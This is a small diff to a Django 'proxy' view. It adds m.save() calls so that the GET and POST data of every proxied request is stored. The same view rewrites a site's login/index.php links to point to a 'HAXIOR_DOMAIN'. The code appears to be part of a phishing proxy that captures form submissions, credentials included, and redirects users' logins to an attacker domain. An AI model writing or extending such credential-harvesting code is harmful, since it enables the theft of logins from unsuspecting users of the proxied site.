@@ -25,6 +25,7 @@ def proxy(request, url):
         m.type = m.GET
         m.data = str(dict(request.GET.iterlists()))
         m.url = url
+        m.save()
         return HttpResponse(content.replace(
                 '%s/login/index.php' % settings.PROXY_DOMAIN,
                 '%s/login/index.php' % settings.HAXIOR_DOMAIN
@@ -37,4 +38,5 @@ def proxy(request, url):
         m.type = m.POST
         m.data = str(dict(request.POST.iterlists()))
         m.url = url
+        m.save()
         return HttpResponse(content)
